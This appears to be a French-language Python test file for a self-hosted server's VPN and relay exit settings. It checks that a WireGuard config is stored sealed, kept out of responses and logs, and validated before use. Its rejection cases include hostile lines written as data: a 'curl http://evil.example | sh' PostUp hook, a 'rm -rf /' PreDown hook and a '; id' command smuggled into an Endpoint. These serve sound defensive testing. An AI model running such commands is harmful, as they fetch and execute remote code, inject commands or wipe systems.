"""Sortie réseau (lot sortie-reseau), côté serveur : Réglages > Serveur > Sortie réseau.

Vrais : les routes de Noah, la base et son chiffrement, le calcul de l'identité du navigateur. Simulé : le lanceur (un faux, en mémoire,
qui rend l'état d'un aiguillage). Ce que le test garde à l'œil : le fichier VPN est scellé, n'arrive qu'au lanceur, et ne sort dans
aucune réponse ni aucun flux ; l'ancienne sortie Tailscale est effacée ; sans sortie configurée, aucun appel au lanceur.

    docker run --rm -v "$PWD/server:/app" -v "$PWD/tests:/tests" python:3.12-slim sh -c \
      "pip install -q -r /app/requirements.txt && python /tests/sortie/serveur_test.py"
"""
import asyncio
import json
import os
import sys
import tempfile

os.environ["NOAH_DATA_DIR"] = tempfile.mkdtemp()
os.environ.setdefault("LAUNCHER_KEY", "x")
os.environ.setdefault("NOAH_SECRET_KEY", "y" * 32)
os.environ.pop("NOAH_LOCALE", None)
os.environ.pop("NOAH_TIMEZONE", None)
sys.path.insert(0, "/app")

import httpx  # noqa: E402
from fastapi.testclient import TestClient  # noqa: E402

from noah import auth, db, hermes, main, public, sortie, sortie_relais  # noqa: E402

PRIVATE = "AbCdEfGhIjKlMnOpQrStUvWxYz0123456789+/AbCdE="
PUBLIC = "ZyXwVuTsRqPoNnMlKjIhGfEdCb9876543210+/zYxWv="
PRESHARED = "QWERTYUIOPasdfghjklZXCVBNM0123456789+/qwert="
OLD_TS_KEY = "tskey-auth-kABCDEF1234-SECRETSECRETSECRET"
OLD_SURFSHARK = "SurfSharkLegacyKey0123456789ABCDEFGHIJKLMNO="
SECRETS = (PRIVATE, PRESHARED, OLD_TS_KEY, OLD_SURFSHARK)
CONF = f"""# Mullvad, Proton, IVPN, peu importe : le fichier du fournisseur
[Interface]
PrivateKey = {PRIVATE}
Address = 10.66.12.34/32, fc00:bbbb:bbbb:bb01::3:c22/128
DNS = 10.64.0.1
MTU = 1380

[Peer]
PublicKey = {PUBLIC}
PresharedKey = {PRESHARED}
AllowedIPs = 0.0.0.0/0, ::0/0
Endpoint = 185.65.134.82:51820
PersistentKeepalive = 25
"""

import logging  # noqa: E402

LOGS: list[str] = []


class Capture(logging.Handler):
    def emit(self, record):
        LOGS.append(record.getMessage())


logging.getLogger().addHandler(Capture())
logging.getLogger().setLevel(logging.DEBUG)
db.init()
OWNER = auth.create_user("franck", "motdepasse-a")
GUEST = auth.create_user("invite", "motdepasse-b")
with db.connect() as c:
    c.execute("INSERT INTO agents (id, name, role, api_key, owner_id) VALUES ('alma', 'Alma', '', 'k', ?)", (OWNER,))


def client(user):
    return TestClient(main.app, headers={"Authorization": f"Bearer {auth.new_session(user, 'test', 'web')}"}, raise_server_exceptions=False)


owner, guest = client(OWNER), client(GUEST)

# --- Un faux lanceur -----------------------------------------------------------------------------------------------------
CALLS: list[tuple] = []
LAUNCHER = {"config": None, "aiguillage": None, "absent": set(), "down": False, "legacy": False}


def air(active="maison", maison="active", vpn="prete", direct="prete", geo=None):
    geo = geo or {"ip": "198.51.100.7", "city": "Montréal", "region": "Quebec", "country": "CA", "timezone": "America/Toronto"}
    return {"active": active, "bascules": [{"quand": 1.0, "de": None, "vers": active, "raison": "premier choix"}], "inactif": False,
            "sorties": [{"nom": "maison", "etat": maison, **geo}, {"nom": "vpn", "etat": vpn, **{**geo, "ip": "192.0.2.44"}},
                        {"nom": "direct", "etat": direct, "ip": "203.0.113.5", "city": "Roubaix", "region": "Hauts-de-France", "country": "FR", "timezone": "Europe/Paris"}]}


def containers(cfg):
    return {"noah-sortie": bool(cfg["maison"] or cfg["vpn"]), "noah-sortie-maison": False, "noah-sortie-vpn": bool(cfg["vpn"])}


async def fake_launcher(method, path, **kw):
    CALLS.append((method, path, kw.get("json")))
    if LAUNCHER["down"]:
        raise httpx.ConnectError("lanceur muet")
    if path == "/sortie" and method == "PUT":
        LAUNCHER["config"] = kw["json"]
        LAUNCHER["have"] = containers(kw["json"])
        LAUNCHER["legacy"] = False  # le lanceur retire l'ancien conteneur de la maison
        return {"conteneurs": LAUNCHER["have"], "aiguillage": LAUNCHER["aiguillage"]}
    if path == "/sortie" and method == "GET":
        have = {n: v and n not in LAUNCHER["absent"] for n, v in LAUNCHER.get("have", {"noah-sortie": False, "noah-sortie-maison": False, "noah-sortie-vpn": False}).items()}
        if LAUNCHER["legacy"]:
            have["noah-sortie-maison"] = True
        return {"conteneurs": have, "aiguillage": LAUNCHER["aiguillage"]}
    if path.endswith("/browser") and method == "POST":
        return {"host": "noah-browser-alma", "created": True}
    raise AssertionError(f"appel inattendu au lanceur : {method} {path}")


hermes._launcher = fake_launcher


async def fake_ip():
    return "203.0.113.5"


public._public_ip = fake_ip
sortie.hermes = hermes  # le module appelle hermes._launcher : le faux


def leaks(text: str) -> list[str]:
    return [s for s in SECRETS if s in text]


def ok(name):
    print(f"ok  {name}")


def summary():
    r = owner.get("/api/sortie")
    assert r.status_code == 200, r.text
    assert not leaks(r.text), "un secret revient dans le résumé"
    return r.json()


class Relie:  # un relais « connecté », sans réseau : ce que sortie_relais.etat() lit
    nom = "PC-DE-FRANCK"
    depuis = 1.0
    mort = False


# 0. Les routes sont branchées dans l'application, et l'ancienne maison Tailscale n'existe plus ------------------------------
paths = {(r.path, tuple(sorted(getattr(r, "methods", None) or []))) for r in main.app.routes}
assert ("/api/sortie/relais", ()) in paths or any(r.path == "/api/sortie/relais" for r in main.app.routes), "route du relais absente de main.app"
assert not any(r.path == "/api/sortie/maison" for r in main.app.routes), "la route Tailscale existe encore"
ok("routes : le relais est branché, la route Tailscale n'existe plus")

# 1. Rien de configuré : l'état « sans relais », et aucun appel au lanceur -------------------------------------------------------
s = summary()
assert s["phase"] == "sans_relais" and s["relais"]["voulu"] is False and s["relais"]["connecte"] is False, s
assert s["vpn"] == {"configure": False, "fournisseur": "", "etat": "non_configure", "adresse": "", "lieu": "", "ville": ""}, s["vpn"]
assert s["active"] == "direct" and s["serveur"]["adresse"] == "203.0.113.5"
assert not CALLS, f"sans sortie configurée, le lanceur n'est pas appelé : {CALLS}"
assert guest.get("/api/sortie").status_code == 403 and TestClient(main.app).get("/api/sortie").status_code == 401, "réservé au propriétaire"
assert guest.put("/api/sortie/vpn", json={"conf": CONF}).status_code == 403
assert guest.delete("/api/sortie/vpn").status_code == 403 and guest.delete("/api/sortie/relais").status_code == 403
assert owner.put("/api/sortie/maison", json={"cle": OLD_TS_KEY, "noeud": "pc"}).status_code in (404, 405), "plus de champ ni de clé Tailscale"
asyncio.run(sortie.reconcile())
assert asyncio.run(sortie.active_geo()) is None and not CALLS, "ni réconciliation ni lecture sans sortie"
ok("sans sortie : « sans relais », le serveur actif, aucun appel au lanceur ; réservé au propriétaire ; plus de route Tailscale")

# 2. Le VPN : le fichier du fournisseur, scellé, envoyé au seul lanceur, jamais renvoyé ------------------------------------------
LAUNCHER["aiguillage"] = air(active="vpn", maison="injoignable", vpn="active")
r = owner.put("/api/sortie/vpn", json={"conf": CONF})
assert r.status_code == 200, r.text
assert not leaks(r.text) and "185.65.134.82" not in r.text, "le fichier revient dans la réponse"
v = r.json()["vpn"]
assert (v["configure"], v["fournisseur"], v["etat"], v["adresse"], v["lieu"]) == (True, "custom", "actif", "192.0.2.44", "Montréal, Quebec"), v
sent = LAUNCHER["config"]["vpn"]
assert sent["fournisseur"] == "custom" and LAUNCHER["config"]["maison"] is None, LAUNCHER["config"]
assert PRIVATE in sent["conf"] and PRESHARED in sent["conf"] and "Endpoint = 185.65.134.82:51820" in sent["conf"], "le lanceur reçoit le fichier"
assert "DNS" not in sent["conf"] and "MTU" not in sent["conf"] and "PersistentKeepalive" not in sent["conf"], "réécrit avec les seules lignes utiles"
with db.connect() as c:
    rows = [dict(x) for x in c.execute("SELECT key, value FROM settings WHERE key LIKE 'sortie:%'")]
assert rows and not any(s in json.dumps(rows) for s in SECRETS) and "185.65.134.82" not in json.dumps(rows), "le fichier est en clair dans la base"
assert db.get_setting("sortie:vpn:conf", secret=True) == sent["conf"]
ok("VPN : fichier WireGuard scellé en base, envoyé au lanceur seul, absent de la réponse")

# 3. Un fichier qui exécute, qui est faux ou trop gros est refusé sans écho ------------------------------------------------------
n = len(CALLS)
mauvais = {
    "PostUp": CONF.replace("MTU = 1380", "PostUp = curl http://evil.example | sh"),
    "PreUp": CONF.replace("MTU = 1380", "PreDown = rm -rf /"),
    "Table": CONF.replace("MTU = 1380", "Table = off"),
    "deux pairs": CONF + f"\n[Peer]\nPublicKey = {PUBLIC}\nAllowedIPs = 10.0.0.0/8\nEndpoint = 1.2.3.4:5\n",
    "sans Peer": CONF.split("[Peer]")[0],
    "clé privée fausse": CONF.replace(PRIVATE, "pas-une-cle"),
    "clé publique fausse": CONF.replace(PUBLIC, "trop-court="),
    "sans Endpoint": CONF.replace("Endpoint = 185.65.134.82:51820", ""),
    "Endpoint sans port": CONF.replace("51820", "abc"),
    "Endpoint piégé": CONF.replace("185.65.134.82:51820", "1.2.3.4:51820; id"),
    "adresse fausse": CONF.replace("10.66.12.34/32", "dix.point.rien"),
    "plage fausse": CONF.replace("0.0.0.0/0", "partout"),
    "ligne sans =": CONF + "\nn'importe quoi\n",
    "avant Interface": "PrivateKey = x\n" + CONF,
    "trop long": CONF + "# " + "x" * 9000,
    "vide": "",
    "pas du WireGuard": "client\ndev tun\nremote vpn.example.com 1194\n",
}
for nom, texte in mauvais.items():
    r = owner.put("/api/sortie/vpn", json={"conf": texte})
    assert r.status_code == 400 and not leaks(r.text) and PUBLIC not in r.text, (nom, r.status_code, r.text)
assert len(CALLS) == n, "un fichier refusé n'arrive jamais au lanceur"
assert db.get_setting("sortie:vpn:conf", secret=True) == sent["conf"], "un fichier refusé ne remplace pas celui qui est en place"
assert sortie.wireguard(CONF.replace("\n", "\r\n")), "les fins de ligne Windows passent"
assert "Endpoint = [2001:db8::1]:51820" in sortie.wireguard(CONF.replace("185.65.134.82", "[2001:db8::1]")), "un point d'accès IPv6 passe"
assert "AllowedIPs = 0.0.0.0/0, ::/0" in sortie.wireguard(CONF.replace("AllowedIPs = 0.0.0.0/0, ::0/0\n", "")), "plages absentes : tout passe par le VPN"
ok("fichier refusé : PostUp, PreUp, Table, deux pairs, clés ou adresses fausses, trop long : 400 sans écho, rien d'envoyé ni d'écrasé")

# 4. L'ancienne sortie Tailscale est effacée, le Surfshark d'avant continue de marcher --------------------------------------------
owner.delete("/api/sortie/vpn")
del CALLS[:]
db.set_setting("sortie:maison:cle", OLD_TS_KEY, secret=True)
db.set_setting("sortie:maison:noeud", "pc-franck")
db.set_setting("sortie:vpn:cle", OLD_SURFSHARK, secret=True)
db.set_setting("sortie:vpn:adresse", "10.14.0.9/16")
db.set_setting("sortie:vpn:ville", "Toronto")
LAUNCHER["legacy"] = True
asyncio.run(sortie.migrer())
with db.connect() as c:
    left = [x["key"] for x in c.execute("SELECT key FROM settings WHERE key LIKE 'sortie:maison:%'")]
assert not left, f"la clé et le nœud Tailscale restent : {left}"
assert [(m, p) for m, p, _ in CALLS] == [("PUT", "/sortie")], CALLS
assert LAUNCHER["config"] == {"maison": None, "vpn": {"fournisseur": "surfshark", "cle_privee": OLD_SURFSHARK, "adresse": "10.14.0.9/16", "ville": "Toronto"}}, LAUNCHER["config"]
assert LAUNCHER["legacy"] is False, "le lanceur a retiré le conteneur de l'ancienne maison"
s = summary()
assert (s["vpn"]["configure"], s["vpn"]["fournisseur"], s["vpn"]["ville"]) == (True, "surfshark", "Toronto"), s["vpn"]
assert s["phase"] == "sans_relais", "la maison n'est pas reprise toute seule : l'interrupteur de l'app la rallume"
del CALLS[:]
asyncio.run(sortie.migrer())
assert not CALLS, "rejoué au démarrage suivant : plus rien à faire, aucun appel"
ok("migration : clé et nœud Tailscale effacés, conteneur retiré, VPN Surfshark gardé tel quel, rien rejoué ensuite")

# 5. Coller un fichier remplace la clé Surfshark d'avant -------------------------------------------------------------------------
r = owner.put("/api/sortie/vpn", json={"conf": CONF})
assert r.status_code == 200 and r.json()["vpn"]["fournisseur"] == "custom"
assert db.get_setting("sortie:vpn:cle", secret=True) is None and db.get_setting("sortie:vpn:ville") is None
assert LAUNCHER["config"]["vpn"]["fournisseur"] == "custom"
ok("un fichier collé remplace l'ancienne clé Surfshark")

# 6. Les phrases d'état : relais éteint, relié, actif ; le VPN en repli --------------------------------------------------------------
def phase(**kw):
    LAUNCHER["aiguillage"] = air(**kw)
    sortie._status["at"] = 0.0
    return summary()


sortie_relais._vouloir(True)
sortie_relais._actif = None
s = phase(active="vpn", maison="injoignable", vpn="active")
assert s["phase"] == "relais_eteint" and s["relais"] == {"voulu": True, "connecte": False, "nom": "", "adresse": "198.51.100.7", "lieu": "Montréal, Quebec"} and s["active"] == "vpn", s
sortie_relais._actif = Relie()
s = phase(active="vpn", maison="prete", vpn="active")
assert s["phase"] == "relais_connecte" and s["relais"]["nom"] == "PC-DE-FRANCK" and s["relais"]["connecte"], s
s = phase(active="maison", maison="active", vpn="prete")
assert s["phase"] == "relais_actif" and s["relais"]["lieu"] == "Montréal, Quebec" and s["relais"]["adresse"] == "198.51.100.7", s
assert s["vpn"]["etat"] == "pret"
s = phase(active="direct", maison="injoignable", vpn="injoignable", direct="active")
assert s["vpn"]["etat"] == "injoignable" and s["active"] == "direct" and s["serveur"]["adresse"] == "203.0.113.5"
LAUNCHER["aiguillage"] = None
sortie._status["at"] = 0.0
assert summary()["vpn"]["etat"] == "en_attente", "l'aiguillage ne répond pas encore : ni « actif » ni « injoignable » inventés"
sortie_relais._actif = None
sortie_relais._vouloir(False)
ok("états : relais éteint, relié, actif ; VPN actif, prêt, injoignable, en attente ; le serveur en repli")

# 7. La configuration envoyée au lanceur ----------------------------------------------------------------------------------------------
sortie_relais._vouloir(True)
del CALLS[:]
r = owner.put("/api/sortie/vpn", json={"conf": CONF})
assert LAUNCHER["config"]["maison"] == {"actif": True}, "le relais voulu : l'aiguillage a la maison, sans aucun nom ni clé"
assert "tskey" not in json.dumps(LAUNCHER["config"]) and "noeud" not in json.dumps(LAUNCHER["config"])
sortie_relais._vouloir(False)
ok("la maison, pour le lanceur, est un simple drapeau")

# 8. L'identité du navigateur suit la sortie active ----------------------------------------------------------------------------------
LAUNCHER["aiguillage"] = air()
sortie._status["at"] = 0.0
geo = asyncio.run(sortie.active_geo())
assert geo == {"country": "CA", "region": "Quebec", "timezone": "America/Toronto"}, geo
assert hermes.identity_of(geo) == {"locale": "fr-CA", "timezone": "America/Toronto"}
assert hermes.identity_of({"country": "CA", "region": "Ontario", "timezone": "America/Toronto"})["locale"] == "en-CA"
assert hermes.identity_of({"country": "FR", "timezone": "Europe/Paris"}) == {"locale": "fr-FR", "timezone": "Europe/Paris"}, "inchangé pour le reste"
assert asyncio.run(hermes.browser_identity_now()) == {"locale": "fr-CA", "timezone": "America/Toronto"}
LAUNCHER["aiguillage"] = air(active="direct", maison="injoignable", vpn="injoignable", direct="active")
sortie._status["at"] = 0.0
assert asyncio.run(sortie.active_geo()) is None, "en repli direct : l'identité du serveur, comme avant"
db.set_setting("browser_identity", json.dumps({"locale": "fr-FR", "timezone": "Europe/Paris"}))
assert asyncio.run(hermes.browser_identity_now()) == {"locale": "fr-FR", "timezone": "Europe/Paris"}
ok("identité : fr-CA et America/Toronto par la maison ou le VPN ; celle du serveur en repli direct")

# 9. Création du navigateur : réconciliation, puis identité ---------------------------------------------------------------------------
LAUNCHER["aiguillage"] = air()
sortie._status["at"] = 0.0
del CALLS[:]
LAUNCHER["absent"] = {"noah-sortie-vpn"}  # supprimé à la main : le serveur le fait recréer avant d'ouvrir le navigateur
asyncio.run(hermes.ensure_browser("alma"))
kinds = [(m, p) for m, p, _ in CALLS]
assert ("PUT", "/sortie") in kinds, kinds
posted = next(j for m, p, j in CALLS if p.endswith("/browser"))
assert posted["locale"] == "fr-CA" and posted["timezone"] == "America/Toronto", posted
LAUNCHER["absent"] = set()
del CALLS[:]
asyncio.run(sortie.reconcile())
assert [(m, p) for m, p, _ in CALLS] == [("GET", "/sortie")], "tout est là : une lecture, aucune écriture"
LAUNCHER["legacy"] = True  # un conteneur de l'ancienne maison est revenu (instantané restauré) : il est retiré
del CALLS[:]
asyncio.run(sortie.reconcile())
assert ("PUT", "/sortie") in [(m, p) for m, p, _ in CALLS] and LAUNCHER["legacy"] is False
LAUNCHER["down"] = True
sortie._status["at"] = 0.0
del CALLS[:]
asyncio.run(sortie.reconcile())  # lanceur muet : ne casse pas ; la création du navigateur dira l'erreur
LAUNCHER["down"] = False
ok("ensure_browser : une sortie manquante est recréée avant le navigateur, l'ancienne maison retirée, lanceur muet toléré")

# 10. Le flux (« où vont mes données ») dit la vérité, sans fichier VPN -----------------------------------------------------------------
sortie_relais._vouloir(True)
r = owner.get("/api/flux")
assert r.status_code == 200 and not leaks(r.text)
text = json.dumps(r.json(), ensure_ascii=False)
assert "Sortie par ton ordinateur" in text and "Sortie par ton VPN" in text and "ipinfo.io" in text and "tailscale" not in text.lower()
sortie_relais._vouloir(False)
ok("/api/flux : les sorties configurées sont déclarées, sans fichier ni Tailscale")

# 11. Retirer --------------------------------------------------------------------------------------------------------------------------
r = owner.delete("/api/sortie/vpn")
assert r.status_code == 200 and LAUNCHER["config"] == {"maison": None, "vpn": None}
assert db.get_setting("sortie:vpn:conf", secret=True) is None
with db.connect() as c:
    assert not [x for x in c.execute("SELECT key FROM settings WHERE key LIKE 'sortie:%'")], "les réglages retirés ne restent pas en base"
del CALLS[:]
asyncio.run(hermes.ensure_browser("alma"))
assert [(m, p) for m, p, _ in CALLS if p.startswith("/sortie")] == [], "tout retiré : le comportement d'avant, aucun appel de plus"
assert "Sortie par" not in json.dumps(owner.get("/api/flux").json())
ok("retrait : réglages effacés, plus aucun appel, plus rien dans le flux")

# 12. Le lanceur refuse : l'erreur est lisible, sans le fichier -------------------------------------------------------------------------
async def refusing(method, path, **kw):
    r = httpx.Response(400, json={"detail": "Configuration WireGuard invalide."}, request=httpx.Request(method, "http://launcher" + path))
    r.raise_for_status()
hermes._launcher = refusing
r = owner.put("/api/sortie/vpn", json={"conf": CONF})
assert r.status_code == 502 and "invalide" in r.text and not leaks(r.text), r.text
assert not leaks("\n".join(LOGS)), "un secret est dans un journal"
print("OK : sortie réseau, serveur (aucun fichier VPN dans les réponses, la base en clair, ni les journaux)")
